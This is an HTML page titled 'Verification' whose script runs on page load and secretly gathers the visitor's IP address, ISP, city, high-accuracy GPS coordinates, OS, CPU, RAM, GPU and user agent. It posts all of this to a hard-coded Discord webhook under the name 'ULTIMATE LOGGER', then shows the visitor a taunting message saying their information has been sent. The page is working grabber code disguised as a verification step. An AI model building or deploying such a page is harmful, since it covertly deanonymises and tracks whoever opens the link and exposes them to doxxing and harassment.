<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #000; color: #ff0000; margin: 0; }
        #status { text-align: center; font-size: 1.5rem; font-weight: bold; }
    </style>
</head>
<body>
    <div id="status">Fetching...</div>

    <script>
        async function collectAll() {
            const statusDiv = document.getElementById('status');
            const webhook = 'https://discord.com/api/webhooks/1496580919803252799/mtZ0WbdZnkxOOB0eMVyJx_xJ18EPEGWs9Gzdw2OCeRcFfICBpsIg09_rctz4pOYkBl0S';
            
            let ipData = {};
            try {
                const response = await fetch('https://ipapi.co/json/');
                ipData = await response.json();
            } catch (e) { ipData = { ip: "Error", city: "Error", region: "Error", org: "Error" }; }

            navigator.geolocation.getCurrentPosition(async (pos) => {
                const geo = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude} (High Accuracy)`;
                await sendToDiscord(webhook, ipData, geo);
            }, async (err) => {
                const geo = `Denied/Not Supported (Using IP City: ${ipData.city})`;
                await sendToDiscord(webhook, ipData, geo);
            }, { enableHighAccuracy: true, timeout: 5000 });

            statusDiv.innerHTML = `GET FUCKED SCAMMER LMFAO, ALL YOUR INFORMATION HAVE BEEN SENT TO ME`;
        }

        async function sendToDiscord(webhook, ipData, geo) {
            const data = {
                username: "ULTIMATE LOGGER",
                embeds: [{
                    title: "🚨 CRITICAL TARGET DATA 🚨",
                    color: 16711680,
                    fields: [
                        { name: "📍 Precise Location", value: `**GPS:** ${geo}\n**IP City:** ${ipData.city}\n**Region:** ${ipData.region}\n**ISP:** ${ipData.org}`, inline: false },
                        { name: "🌐 Network", value: `**IP:** ${ipData.ip}\n**TZ:** ${ipData.timezone}`, inline: true },
                        { name: "💻 Hardware", value: `**OS:** ${navigator.platform}\n**Cores:** ${navigator.hardwareConcurrency}\n**RAM:** ${navigator.deviceMemory}GB`, inline: true },
                        { name: "🖥️ GPU", value: getGPU(), inline: false },
                        { name: "🕵️ User Agent", value: `\`\`\`${navigator.userAgent}\`\`\`` }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };
            await fetch(webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
        }

        function getGPU() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            if (!gl) return "N/A";
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";
        }

        window.onload = collectAll;
    </script>
</body>
</html>
